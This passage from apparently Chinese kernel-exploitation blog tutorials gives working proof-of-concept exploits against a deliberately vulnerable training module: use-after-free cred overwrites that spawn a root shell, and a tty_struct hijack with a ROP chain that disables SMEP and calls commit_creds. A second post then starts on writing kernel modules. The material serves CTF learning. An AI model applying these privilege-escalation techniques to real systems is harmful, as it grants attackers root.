retval;\n}\n\n\nstatic int stack_open(struct inode *i, struct file *f)\n{\n    printk(KERN_INFO \"[i] Module stack: open()\\n\");\n    return 0;\n}\n\nstatic int stack_close(struct inode *i, struct file *f)\n{\n    kfree(buffer_var);\n    //buffer_var = NULL;\n    printk(KERN_INFO \"[i] Module stack: close()\\n\");\n    return 0;\n}\n\nmodule_init(stack_init);\nmodule_exit(stack_exit);\n\nMODULE_LICENSE(\"GPL\");\n// MODULE_AUTHOR(\"blackndoor\");\n// MODULE_DESCRIPTION(\"Module vuln overflow\");\n```\n\n# 一、利用Cred结构体提权\n\n## 1.正常UAF\n\n### 前置知识\n\n由于是UAF漏洞，所以直接尝试再重启一个进程，这样新进程启动时就会申请一个Cred结构体(这里大小为0xa8)。而如果此时申请的结构体恰好落在我们释放过的堆块上，那么我们就可以利用UAF漏洞修改Cred结构体，将其uid和gid改为0，再利用该进程原地起shell，就能获得root权限的shell了。\n\n这里同样需要一点前置知识，之前也写过类似的，其实就相当于修改某个进程的cred结构体中的uid和gid就能将该进程提权了，之后利用提权后的进程起shell得到的shell就是提权后的shell。\n\n比较简单，这里直接给\n\n### POC\n\n```C\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <errno.h>\n#include <sys/mman.h>\n#include <assert.h>\n\n\nstruct addNote\n{\n    size_t len;\n    char* data;\n};\n\nstruct editNote\n{\n    size_t idx;\n    size_t len;\n    char* data;\n};\n\n\n\n//open dev\nint openDev(char* pos);\nvoid addFun(int fd,struct addNote* arg);\nvoid freeFun(int fd,struct editNote* arg);\nvoid editFun(int fd,struct editNote* arg);\nvoid readFun(int fd,struct editNote* arg);\n\n\nint main(int argc, char *argv[])\n{\n    int fd;\n    int idFork;\n    unsigned long memOffset;\n    struct addNote addChunk;\n    struct editNote readChunk;\n    struct editNote editChunk;\n\n    //open Dev\n    char* pos = \"/dev/stack\";\n    fd = openDev(pos);\n    \n    char credBuf[0xa8] = {0};\n    addChunk.len = 0xa8;\n    addChunk.data = credBuf;\n    addFun(fd,&addChunk);\n    \n    editChunk.idx = 0;\n    freeFun(fd,&editChunk);\n    \n    idFork = fork();\n    editChunk.data = credBuf;\n    editChunk.len = 28;\n    if(idFork == 0){\n        //get into 28*0 to set uid and gid 0\n        editFun(fd,&editChunk);     \n        if(getuid() == 0){\n            printf(\"[*]welcome root:\\n\");\n            system(\"/bin/sh\");\n            return 0;\n        }\n    }\n    else if(idFork < 0){\n        printf(\"[*]fork fail\\n\");\n    }\n    else{\n        wait(NULL);\n    }\n    \n    return 0;\n\n}\n\n\nint openDev(char* pos){\n    int fd;\n    printf(\"[+] Open %s...\\n\",pos);\n    if ((fd = open(pos, O_RDWR)) < 0) {\n        printf(\"    Can't open device file: %s\\n\",pos);\n        exit(1);\n    }\n    return fd;\n}\n\nvoid addFun(int fd, struct addNote* arg)\n{\n    ioctl(fd,1,arg);\n}\n\nvoid freeFun(int fd, struct editNote* arg)\n{\n    ioctl(fd,888,arg);\n}\n\nvoid editFun(int fd, struct editNote* arg)\n{\n    ioctl(fd,3,arg);\n}\n\nvoid readFun(int fd, struct editNote* arg)\n{\n    ioctl(fd,4,arg);\n}\n```\n\n这里还需要说明的是，cred结构体大小在我编译的4.4.72中为0xa8，在不同内核版本可能不同，通常可以查看对应版本的Linux内核源码或者写个简便的C程序运行一下即可知道。\n\n## 2.伪条件竞争造成的UAF(多进程)\n\n### 前置知识\n\n前面我们的UAF是正常的指针未置空的UAF，但如果在程序中是add函数申请chunk，只有在关闭设备时才会释放chunk。那么这样当我们对一个设备进行操作时，只有在关闭设备时才能释放chunk，这就无法显著地造成UAF。但是如果能够对同一个设备打开两次  (操作符分别为fd1,fd2) ，申请一个堆块后，关闭掉第一个设备fd1后，就能释放该堆块。之后利用fd2继续对设备进行写操作，就能够继续修改释放掉的堆块了，这样就造成了一个UAF漏洞。同样也是利用cred结构体进行提权。\n\n同样直接给出poc即可\n\n### POC\n\n```c\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <errno.h>\n#include <sys/mman.h>\n#include <assert.h>\n\n\n\n\n\nstruct addNote\n{\n    size_t len;\n    char* data;\n};\n\nstruct editNote\n{\n    size_t idx;\n    size_t len;\n    char* data;\n};\n\n\n//open dev\nint openDev(char* pos);\nvoid addFun(int fd,struct addNote* arg);\nvoid freeFun(int fd,struct editNote* arg);\nvoid editFun(int fd,struct editNote* arg);\nvoid readFun(int fd,struct editNote* arg);\n\n\nint main(int argc, char *argv[])\n{\n    int fd1,fd2;\n    int idFork,idBefore;\n    unsigned long memOffset;\n    struct addNote addChunk;\n    struct editNote readChunk;\n    struct editNote editChunk;\n    //char *mycred;\n\n    //mycred = current_user_ns();\n    //printf(\"Cred_addr:0x%llx\\n\",mycred);\n    \n    //open Dev\n    char* pos = \"/dev/stack\";\n    char credBuf[0xa8] = {0};\n    fd1 = openDev(pos);\n    fd2 = openDev(pos);\n    ioctl(fd1,111,editChunk); //test add\n    close(fd1);\n    \n    idFork = fork();\n    printf(\"idFork:%d\\n\",idFork);\n    \n    if(idFork == 0){\n        //get into 28*0 to set uid and gid 0\n        idBefore = getuid();\n        printf(\"Before uid:%d\\n\",idBefore);\n        write(fd2, credBuf, 28);\n        \n        if(getuid() == 0){\n            printf(\"[*]welcome root:\\n\");\n            system(\"/bin/sh\");\n            return 0;\n        }\n    }\n    else if(idFork < 0){\n        printf(\"[*]fork fail\\n\");\n    }\n    else{\n        wait(NULL);\n    }\n    \n    return 0;\n\n}\n\n\nint openDev(char* pos){\n    int fd;\n    printf(\"[+] Open %s...\\n\",pos);\n    if ((fd = open(pos, O_RDWR)) < 0) {\n        printf(\"    Can't open device file: %s\\n\",pos);\n        exit(1);\n    }\n    return fd;\n}\n\nvoid addFun(int fd, struct addNote* arg)\n{\n    ioctl(fd,1,arg);\n}\n\nvoid freeFun(int fd, struct editNote* arg)\n{\n    ioctl(fd,888,arg);\n}\n\nvoid editFun(int fd, struct editNote* arg)\n{\n    ioctl(fd,3,arg);\n}\n\nvoid readFun(int fd, struct editNote* arg)\n{\n    ioctl(fd,4,arg);\n}\n\n\n```\n\n\n\n\n\n# 二、劫持tty_struct结构体\n\n这个真是调了我无敌久。\n\n## 原理\n\n### 1.函数调用链\n\n`entry_SYSCALL_64`->`SyS_write`->`SYSC_write`->`vfs_write`\n\n->`__vfs_write`->`tty_write`->`do_tty_write`->`n_tty_write`->`pty_write`\n\n这里我们需要的就是劫持某个结构体，从而使得原本通过该结构体调用`pty_write`函数指针变为调用我们的ROP链条。\n\n### 2.劫持栈\n\n由于用户空间和内核空间得返回进入需要用到栈，所以一般需要进行栈劫持，这里我们可以看到当通过ptmx进入其write函数时，rax为从tty_struct中获取的operations* ops指针，而此时该指针已经被我们劫持了，所以如果有类似于mov rsp,rax之类的gadget就能将栈劫持到我们可控的operations* ops指针指向的内存处，那么之后就很容易进行内核和用户空间的转换。\n\n这里就用到常用的一个gadget\n\nmovRspRax_decEbx_ret\n\n![image-20211011000008800](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211011000009.png)\n\n### 3.结构体\n\n这个之前也是讲过的\n\n```c\nstruct tty_struct {\n    int magic;\n    struct kref kref;\n    struct device *dev;\n    struct tty_driver *driver;\n    const struct tty_operations *ops;\n    int index;\n\n    /* Protects ldisc changes: Lock tty not pty */\n    struct ld_semaphore ldisc_sem;\n    struct tty_ldisc *ldisc;\n\n    struct mutex atomic_write_lock;\n    struct mutex legacy_mutex;\n    struct mutex throttle_mutex;\n    struct rw_semaphore termios_rwsem;\n    struct mutex winsize_mutex;\n    spinlock_t ctrl_lock;\n    spinlock_t flow_lock;\n    /* Termios values are protected by the termios rwsem */\n    struct ktermios termios, termios_locked;\n    struct termiox *termiox; /* May be NULL for unsupported */\n    char name[64];\n    struct pid *pgrp; /* Protected by ctrl lock */\n    struct pid *session;\n    unsigned long flags;\n    int count;\n    struct winsize winsize; /* winsize_mutex */\n    unsigned long stopped:1, /* flow_lock */\n        flow_stopped:1,\n        unused:BITS_PER_LONG - 2;\n    int hw_stopped;\n    unsigned long ctrl_status:8, /* ctrl_lock */\n        packet:1,\n        unused_ctrl:BITS_PER_LONG - 9;\n    unsigned int receive_room; /* Bytes free for queue */\n    int flow_change;\n\n    struct tty_struct *link;\n    struct fasync_struct *fasync;\n    int alt_speed; /* For magic substitution of 38400 bps */\n    wait_queue_head_t write_wait;\n    wait_queue_head_t read_wait;\n    struct work_struct hangup_work;\n    void *disc_data;\n    void *driver_data;\n    struct list_head tty_files;\n\n#define N_TTY_BUF_SIZE 4096\n\n    int closing;\n    unsigned char *write_buf;\n    int write_cnt;\n    /* If the tty has a pending do_SAK, queue it here - akpm */\n    struct work_struct SAK_work;\n    struct tty_port *port;\n};\n```\n\n当我们打开ptmx设备时，会使用kmalloc申请这个tty_struct结构，如果存在一个UAF漏洞，那么就可以将该tty_struct申请为我们释放掉的一个chunk，其中重要的是int magic;和const struct tty_operations *ops;这两个结构体成员。\n\n#### magic成员\n\n这个在网上很多人都直接将其设置为0，但是在某些版本中，如果直接设置为0，通常可能出现以下的错误：\n\n![image-20211010233205104](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010233212.png)\n\n也就是magic number检测错误，这个经过调试可以发现，实际申请结构体之后是不变的：\n\n![Snipaste_2021-10-10_23-37-19](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010233737.png)\n\n可以得到如下的数值\n\n![image-20211010233844033](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010233844.png)\n\n这个在后面的数值设置中可以用到，需要我们来调试才可以，不然其实如果直接设置为0也容易出错。\n\n另外其中的driver可以设置为0，所以一般直接设置tty_struct[3]和tty_struct[0]即可。\n\n#### ops成员\n\n这个const struct tty_operations *ops结构体指针在该做法里被劫持为我们设置fake_operations指针，有如下结构体，设置fake_operations中的write函数指针为ROP链条，就可以通过调用ptmx设备中的write函数，从而调用到我们设置的ROP链条。\n\n```c\nstruct tty_operations {\n    struct tty_struct * (*lookup)(struct tty_driver *driver,\n    struct inode *inode, int idx);\n    int (*install)(struct tty_driver *driver, struct tty_struct *tty);\n    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);\n    int (*open)(struct tty_struct * tty, struct file * filp);\n    void (*close)(struct tty_struct * tty, struct file * filp);\n    void (*shutdown)(struct tty_struct *tty);\n    void (*cleanup)(struct tty_struct *tty);\n    int (*write)(struct tty_struct * tty,\n        const unsigned char *buf, int count);\n    int (*put_char)(struct tty_struct *tty, unsigned char ch);\n    void (*flush_chars)(struct tty_struct *tty);\n    int (*write_room)(struct tty_struct *tty);\n    int (*chars_in_buffer)(struct tty_struct *tty);\n    int (*ioctl)(struct tty_struct *tty,\n        unsigned int cmd, unsigned long arg);\n    long (*compat_ioctl)(struct tty_struct *tty,\n        unsigned int cmd, unsigned long arg);\n    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);\n    void (*throttle)(struct tty_struct * tty);\n    void (*unthrottle)(struct tty_struct * tty);\n    void (*stop)(struct tty_struct *tty);\n    void (*start)(struct tty_struct *tty);\n    void (*hangup)(struct tty_struct *tty);\n    int (*break_ctl)(struct tty_struct *tty, int state);\n    void (*flush_buffer)(struct tty_struct *tty);\n    void (*set_ldisc)(struct tty_struct *tty);\n    void (*wait_until_sent)(struct tty_struct *tty, int timeout);\n    void (*send_xchar)(struct tty_struct *tty, char ch);\n    int (*tiocmget)(struct tty_struct *tty);\n    int (*tiocmset)(struct tty_struct *tty,\n        unsigned int set, unsigned int clear);\n    int (*resize)(struct tty_struct *tty, struct winsize *ws);\n    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);\n    int (*get_icount)(struct tty_struct *tty,\n    struct serial_icounter_struct *icount);\n#ifdef CONFIG_CONSOLE_POLL\n    int (*poll_init)(struct tty_driver *driver, int line, char *options);\n    int (*poll_get_char)(struct tty_driver *driver, int line);\n    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);\n#endif\n    const struct file_operations *proc_fops;\n};\n```\n\n\n\n![image-20211010234216013](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010234216.png)\n\n### 4.最终结构\n\n#### fake_tty_struct结构体\n\n![image-20211010235017786](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010235018.png)\n\n#### fake_tty_operation结构体\n\n![image-20211010235311913](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010235328.png)\n\n![image-20211010235416812](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010235417.png)\n\n## POC\n\n```c\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <errno.h>\n#include <sys/mman.h>\n#include <assert.h>\n#include <linux/tty.h>\n\n\nstruct cred;\nstruct task_struct;\ntypedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));\ntypedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));\nprepare_kernel_cred_t   prepare_kernel_cred;\ncommit_creds_t    commit_creds;\n\nunsigned long user_cs;\nunsigned long user_ss;\nunsigned long user_rflags;\nunsigned long user_sp;\n\n#define tty_size 0x2e0\n\n\nstruct addNote\n{\n    size_t len;\n    char* data;\n};\n\nstruct editNote\n{\n    size_t idx;\n    size_t len;\n    char* data;\n};\n\n\n\n//ROP func\nunsigned long findAddr();\nvoid save_state();\nvoid getroot (void);\nvoid shell(void);\n\n//open dev\nint openDev(char* pos);\nvoid addFun(int fd,struct addNote* arg);\nvoid freeFun(int fd,struct editNote* arg);\nvoid editFun(int fd,struct editNote* arg);\nvoid readFun(int fd,struct editNote* arg);\n\n\nint main(int argc, char *argv[])\n{\n    int fd,fd_tty;\n    char buf[0x10];\n    int i = 0;\n    unsigned long memOffset;\n    struct addNote addChunk;\n    struct editNote readChunk;\n    struct editNote editChunk;\n\n    unsigned long smpOffset = 0x1146000;\n    memOffset = findAddr();\n    \n    //debug kernel\n    unsigned long vmBase = memOffset - smpOffset;\n    unsigned long pop_rdi_ret = vmBase + 0x3d032d;\n    unsigned long pop_rax_rbx_r12_r13_rbp_ret = vmBase + 0x46c45e;\n    unsigned long movCr4Rdi_pop_rbp_ret = vmBase + 0x004c40;\n    unsigned long movRspRax_decEbx_ret = vmBase + 0x805115;\n    unsigned long swapgs_sysret = (unsigned long)vmBase + 0x60ba2;\n    unsigned long swapgs_popRbp_ret = (unsigned long)vmBase + 0x60394;\n    unsigned long iretq = (unsigned long)vmBase + 0x803857;\n    unsigned long getR = (unsigned long)getroot;\n    unsigned long sh = (unsigned long)shell;\n    unsigned long sp;\n    size_t rop[32];\n    \n    commit_creds        = (commit_creds_t)(vmBase + 0x9f4a0);\n    prepare_kernel_cred = (prepare_kernel_cred_t)(vmBase + 0x9f870);\n\n\n    // unsigned long vmBase = memOffset - smpOffset;\n    // unsigned long pop_rdi_ret = vmBase + 0xFE3542;\n    \n    // unsigned long pop_rax_rbx_r12_rbp_ret = vmBase + 0x3794b9;\n    // unsigned long movCr4Rax_pop_rbp_ret = vmBase + 0xe0e4;\n    // unsigned long movRspRax_decEbx_ret = vmBase + 0x8841CF;\n    // unsigned long getR = (unsigned long)getroot;\n    // unsigned long swapgs_ret = (unsigned long)vmBase + 0x884188;\n    // unsigned long iretq = (unsigned long)vmBase + 0x882d77;\n    // unsigned long sh = (unsigned long)shell;\n    \n    //print part\n    printf(\"pop_rdi_ret:0x%llx\\n\",pop_rdi_ret);\n    printf(\"movCr4Rdi_pop_rbp_ret:0x%llx\\n\",movCr4Rdi_pop_rbp_ret);\n    printf(\"movRspRax_decEbx_ret:0x%llx\\n\",movRspRax_decEbx_ret);\n    printf(\"iretq:0x%llx\\n\",iretq);\n    \n    //open Dev\n    char* pos = \"/dev/stack\";\n    fd = openDev(pos);\n    char ttyBuf[tty_size] = {'0'};\n    addChunk.len = tty_size;\n    addChunk.data = ttyBuf;\n    addFun(fd,&addChunk);\n\n\n    void* fake_tty_operations[30];\n    for(int i = 0; i < 30; i++)\n    {\n        fake_tty_operations[i] = movRspRax_decEbx_ret;\n    }\n    fake_tty_operations[0] = pop_rax_rbx_r12_r13_rbp_ret;\n    fake_tty_operations[1] = (size_t)rop;\n    \n    size_t fake_tty_struct[4] = {0};\n    fake_tty_struct[0] = 0x0000000100005401;//need to set magic number\n    fake_tty_struct[1] = 0;\n    fake_tty_struct[2] = 0;\n    fake_tty_struct[3] = (size_t)fake_tty_operations;\n\n\n\n    editChunk.idx = 0;\n    editChunk.len = 0x20;\n    editChunk.data = fake_tty_struct;\n    \n    freeFun(fd,&editChunk);\n    \n    pos = \"/dev/ptmx\";\n    fd_tty = openDev(pos);\n    printf(\"fd_tty:0x%d\\n\",fd_tty);\n    editFun(fd, &editChunk);\n\n\n    //rop set\n    save_state();\n    rop[i++] = pop_rdi_ret;      // pop_rax_rbx_r12_rbp_ret\n    rop[i++] = 0x6f0;\n    rop[i++] = movCr4Rdi_pop_rbp_ret;      // mov cr4, rax; pop rbp; ret;\n    rop[i++] = 0;\n    rop[i++] = (size_t)getR;\n    rop[i++] = swapgs_popRbp_ret;      // swapgs;ret\n    rop[i++] = 0x0;\n    rop[i++] = iretq;      // iretq\n    rop[i++] = (size_t)sh;\n    rop[i++] = user_cs;                /* saved CS */\n    rop[i++] = user_rflags;            /* saved EFLAGS */\n    rop[i++] = user_sp;\n    rop[i++] = user_ss;\n    \n    write(fd_tty,buf,0x10);\n    \n    return 0;\n\n}\n\n\nint openDev(char* pos){\n    int fd;\n    printf(\"[+] Open %s...\\n\",pos);\n    if ((fd = open(pos, O_RDWR)) < 0) {\n        printf(\"    Can't open device file: %s\\n\",pos);\n        exit(1);\n    }\n    return fd;\n}\n\nvoid addFun(int fd, struct addNote* arg)\n{\n    ioctl(fd,1,arg);\n}\n\nvoid freeFun(int fd, struct editNote* arg)\n{\n    ioctl(fd,888,arg);\n}\n\nvoid editFun(int fd, struct editNote* arg)\n{\n    ioctl(fd,3,arg);\n}\n\nvoid readFun(int fd, struct editNote* arg)\n{\n    ioctl(fd,4,arg);\n}\n\n\nvoid save_state() {\n   __asm__(\"mov %cs,user_cs;\"\n           \"mov %ss,user_ss;\"\n           \"mov %rsp,user_sp;\"\n           \"pushf;\"\n           \"pop user_rflags;\"\n           );\n  puts(\"user states have been saved!!\");\n}\n\n\nvoid shell(void) {\n  printf(\"[+] getuid() ...\");\n  if(!getuid()) {\n    printf(\" [root]\\n[+] Enjoy your shell...\\n\");\n    system(\"/bin/sh\");\n  } else {\n    printf(\"[+] not root\\n[+] failed !!!\\n\");\n  }\n}\n\n/* function to get root id */\nvoid getroot (void)\n{\n  commit_creds(prepare_kernel_cred(0));\n}\n\nunsigned long findAddr() {\n\n    char line[512];\n    char string[] = \"Freeing SMP alternatives memory\";\n    char found[17];\n    unsigned long addr=0;\n    \n    /* execute dmesg and place result in a file */\n    printf(\"[+] Excecute dmesg...\\n\");\n    system(\"dmesg > /tmp/dmesg\");\n    \n    printf(\"[+] Find usefull addr...\\n\");\n    FILE* file = fopen(\"/tmp/dmesg\", \"r\");\n    \n    while (fgets(line, sizeof(line), file)) {\n        if(strstr(line,string)) {\n            strncpy(found,line+53,16);\n            sscanf(found,\"%p\",(void **)&addr);\n            break;\n        }\n    }\n    fclose(file);\n    \n    if(addr==0) {\n        printf(\"    dmesg error...\\n\");\n        exit(1);\n    }\n    \n    return addr;\n\n}\n```\n\n## 执行流程\n\n这里还得说一下执行流程，比较不好调试\n\n即先是依据write函数跳转到我们最开始设置的gadget，也就是movRspRax_decEbx_ret，然后将栈劫持为fake_tty_operations。之后再跳转到pop_rax_rbx_r12_r13_rbp_ret，将ROP赋值给rax，再ret到\n\nmovRspRax_decEbx_ret，再将栈劫持为ROP，之后就ret到ROP链条中的pop_rdi_ret了，之后执行流可控。\n\n\n\n# ▲注意事项：\n\nswapgs;ret没有时，可以用加上pop的，只要最后ret到iretq即可。同样的gadget可以相互转换。\n\niretq类似于ret，直接一个指令即可。\n\n寄存器保存需要在进入内核之前。\n\n堆块申请时的规则需要是`GFP_KERNEL`才行，至少`GFP_DMA`不行。\n","tags":["pwnKernel"],"categories":["pwnKernel"]},{"title":"pwnKernel从0开始(一)","url":"/2021/09/06/Kernel从0开始(一)/","content":"\n\n\n# 前言\n\n网上一大堆教编译内核的，但由于我的水平太菜，很多教程我看得特别迷糊。还有第一次编译内核时，没设置好参数，直接把虚拟机编译炸开了。所以就想着能不能先做个一键获取内核源码和相关vmlinux以及bzImage的脚本，先试试题，后期再深入探究编译内核，加入debug符号什么的，所以就有了这个一键脚本。\n\n这个直接看我的项目就好了，我是直接拖官方的docker，然后把编译所需要的环境都重新安装了一遍，基本可以适配所有环境，安装各个版本的内核，外加调试信息也可以配置\n\n[PIG-007/kernelAll (github.com)](https://github.com/PIG-007/kernelAll)\n\n前置环境，前置知识啥的在上面已经足够了，如果还是感觉有点迷糊可以再去搜搜其他教程。看雪的`钞sir`师傅和csdn上的`ha1vk`师傅就很不错啊，还有安全客上的`ERROR404`师傅\n\n钞sir师傅:[Ta的论坛 (pediy.com)](https://bbs.pediy.com/user-818602.htm)\n\nha1vk师傅:[kernel- CSDN搜索](https://so.csdn.net/so/search?q=kernel&t=blog&u=seaaseesa)\n\nerror404师傅:[Kernel Pwn 学习之路(一) - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/201043)\n\n这个系列记录新的kernel解析，旨在从源码题目编写，不同内核版本来进行各式各样的出题套路解析和exp的解析。另外内核的pwn基本都是基于某个特定版本的内核来进行模块开发，而出漏洞地方就是这个模块，我们可以借助这个模块来攻破内核，所以我们进行内核pwn的时候，最应该先学习的就是一些简单内核驱动模块的开发。\n\n# 一、例子编写\n\n首先最简单和经典的的Hello world\n\n```c\n//注释头\n\n//由于基本都是用下载的内核编译，所以这里的头文件直接放到正常的编译器中可能找不到对应的头文件。\n//在自己下载的编译好的内核中自己找对应的，然后Makefile中来设置内核源码路径\n#include <linux/init.h>\n#include <linux/module.h>\n#include <linux/kernel.h>\nMODULE_LICENSE(\"Dual BSD/GPL\");\nstatic int __init hello_init(void) \n{\n    printk(\"PIG007:Hello world!\\n\");\n    return 0;\n}\nstatic void __exit hello_exit(void) \n{\n    printk(\"PIG007:Bye,world\\n\");\n}\nmodule_init(hello_init);\nmodule_exit(hello_exit);\n```\n\n## 1.头文件简介\n\n`module.h`:包含可装载模块需要的大量符号和函数定义。\n\n`init.h`:指定初始化模块方面和清除函数。\n\n另外大部分模块还包括`moduleparam.h`头文件，这样就可以在装载的时候向模块传递参数。而我们常常用的函数`_copy_from_user`则来自头文件`uaccess.h`\n\n## 2.模块许可证\n\n```c\n//注释头\n\nMODULE_LICENSE(\"Dual BSD/GPL\");\n```\n\n这个就是模块许可证，**具体有啥用不太清楚**，如有大佬恳请告知。可以通过下列命令查询\n\n```bash\ngrep \"MODULE_LICENSE\" -B 27 /usr/src/linux-headers-`uname -r`/include/linux/module.h\n```\n\n![image-20210927100912684](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210927101536.png)\n\n或者网址[Linux内核许可规则 — The Linux Kernel documentation](https://www.kernel.org/doc/html/latest/translations/zh_CN/process/license-rules.html)\n\n## 3.模块加载卸载\n\n### 加载\n\n一般以 __init标识声明，返回值为0表示加载成功，为负数表示加载失败。用来初始化，定义之类的。\n\n```c\nstatic int __init hello_init(void)\n```\n\n在整个模块的最后加上\n\n```c\nmodule_init(hello_init);\n```\n\n来通过这个init函数加载模块\n\n### 卸载\n\n一般以 __exit标识声明，用来释放空间，清除一些东西的。\n\n```c\nstatic void __exit hello_exit(void) \n```\n\n同样的模块最后加上以下代码来卸载\n\n```\nmodule_exit(hello_exit);\n```\n\n▲其实加载和卸载有点类似于面向对象里的构造函数和析构函数。\n\n以上是一个最简单的例子，下面讲讲实际题目的编写，实际的题目一般涉及驱动的装载。\n\n# 二、题目编写\n\n由于模块装载是在内核启动时完成的(root下也可以设置再insmod装载)，所以一般需要安装驱动，通过驱动来启动模块中的代码功能。而驱动类型也一般有两种，一种是字符型设备驱动，一种是globalmem虚拟设备驱动。\n\n分配得到的设备号可由`cat /proc/devices`来查看\n\n![image-20220330164118552](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330164118552.png)\n\n## 1.字符型设备驱动\n\n### (1)安装套路\n\n首先了解一下驱动设备的结构体：\n\n```c\n///linux/cdev.h   kernel 5.14.8\n\nstruct cdev {\n\tstruct kobject kobj;\t// 内嵌的kobject对象\n\tstruct module *owner;\t// 所属模块\n\tconst struct file_operations *ops;\t// 文件操作结构体,用来进行交互\n\tstruct list_head list;\n\tdev_t dev;\t\t\t\t// 设备号\n\tunsigned int count;\n} __randomize_layout;\n```\n\n然后就是套路编写\n\n```c\n// 设备结构体\nstruct xxx_dev_t {\n    struct cdev cdev;\n} xxx_dev;\n\n// 设备驱动模块加载函数\nstatic int __init xxx_init(void)\n{\n    char* DEV_NAME = 'PIG-007';\n    // 初始化cdev\n    cdev_init(&xxx_dev.cdev, &xxx_fops); \n    xxx_dev.cdev.owner = THIS_MODULE;\n    \n    // 获取字符设备号\n    if (xxx_major) {\n     \t//使用指定的设备号进行分配,xxx_dev_no为设备号,1为设备个数\n        register_chrdev_region(xxx_dev_no, 1, DEV_NAME);\n    } else {\n        alloc_chrdev_region(&xxx_dev_no, 1, DEV_NAME);\n    }\n    //申请设备号常用alloc_chrdev_region,表动态申请设备号\n    //如果指定分配的时候如果占用了就容易出错\n    \n    // 注册设备\n    ret = cdev_add(&xxx_dev.cdev, xxx_dev_no, 1); \n    \n}\n// 设备驱动模块卸载函数\nstatic void __exit xxx_exit(void)\n{\n    // 释放占用的设备号\n    unregister_chrdev_region(xxx_dev_no, 1); \n    cdev_del(&xxx_dev.cdev);\n}\n```\n\n这样简单的驱动就安装完了，安装完了之后，我们想要使用这个驱动的话，还需要进行交互，向驱动设备传递数据，所以上面的`xxx_fops`，即`file_operations`这个结构体就起到了这个功能。\n\n有的时候安装注册设备驱动需要用到class来创建注册，原因未知：\n\n```c\nstatic int __init xxx_init(void)\n{\n    buffer_var=kmalloc(100,GFP_DMA);\n    printk(KERN_INFO \"[i] Module xxx registered\");\n    if (alloc_chrdev_region(&dev_no, 0, 1, \"xxx\") < 0)\n    {\n        return -1;\n    }\n    if ((devClass = class_create(THIS_MODULE, \"chardrv\")) == NULL)\n    {\n        unregister_chrdev_region(dev_no, 1);\n        return -1;\n    }\n    if (device_create(devClass, NULL, dev_no, NULL, \"xxx\") == NULL)\n    {\n        printk(KERN_INFO \"[i] Module xxx error\");\n        class_destroy(devClass);\n        unregister_chrdev_region(dev_no, 1);\n        return -1;\n    }\n    cdev_init(&cdev, &xxx_fops);\n    if (cdev_add(&cdev, dev_no, 1) == -1)\n    {\n        device_destroy(devClass, dev_no);\n        class_destroy(devClass);\n        unregister_chrdev_region(dev_no, 1);\n        return -1;\n    }\n\n    printk(KERN_INFO \"[i] <Major, Minor>: <%d, %d>\\n\", MAJOR(dev_no), MINOR(dev_no));\n    return 0;\n\n}\n```\n\n\n\n### (2)交互套路\n\n安装完成之后还需要交互，用到`file_operations`结构体中的成员函数，首先了解下这个结构体。\n\n```C\n///linux/fs.h \tkernel 5.14.8\n\nstruct file_operations {\n\tstruct module *owner;\n\tloff_t (*llseek) (struct file *, loff_t, int);\n\tssize_t (*read) (struct file *, char __user *, size_t, loff_t *);\n\tssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);\n\tssize_t (*read_iter) (struct kiocb *, struct iov_iter *);\n\tssize_t (*write_iter) (struct kiocb *, struct iov_iter *);\n\tint (*iopoll)(struct kiocb *kiocb, bool spin);\n\tint (*iterate) (struct file *, struct dir_context *);\n\tint (*iterate_shared) (struct file *, struct dir_context *);\n\t__poll_t (*poll) (struct file *, struct poll_table_struct *);\n\tlong (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);\n\tlong (*compat_ioctl) (struct file *, unsigned int, unsigned long);\n\tint (*mmap) (struct file *, struct vm_area_struct *);\n\tunsigned long mmap_supported_flags;\n\tint (*open) (struct inode *, struct file *);\n\tint (*flush) (struct file *, fl_owner_t id);\n\tint (*release) (struct inode *, struct file *);\n\tint (*fsync) (struct file *, loff_t, loff_t, int datasync);\n\tint (*fasync) (int, struct file *, int);\n\tint (*lock) (struct file *, int, struct file_lock *);\n\tssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);\n\tunsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);\n\tint (*check_flags)(int);\n\tint (*flock) (struct file *, int, struct file_lock *);\n\tssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int);\n\tssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int);\n\tint (*setlease)(struct file *, long, struct file_lock **, void **);\n\tlong (*fallocate)(struct file *file, int mode, loff_t offset,\n\t\t\t  loff_t len);\n\tvoid (*show_fdinfo)(struct seq_file *m, struct file *f);\n#ifndef CONFIG_MMU\n\tunsigned (*mmap_capabilities)(struct file *);\n#endif\n\tssize_t (*copy_file_range)(struct file *, loff_t, struct file *,\n\t\t\tloff_t, size_t, unsigned int);\n\tloff_t (*remap_file_range)(struct file *file_in, loff_t pos_in,\n\t\t\t\t   struct file *file_out, loff_t pos_out,\n\t\t\t\t   loff_t len, unsigned int remap_flags);\n\tint (*fadvise)(struct file *, loff_t, loff_t, int);\n} 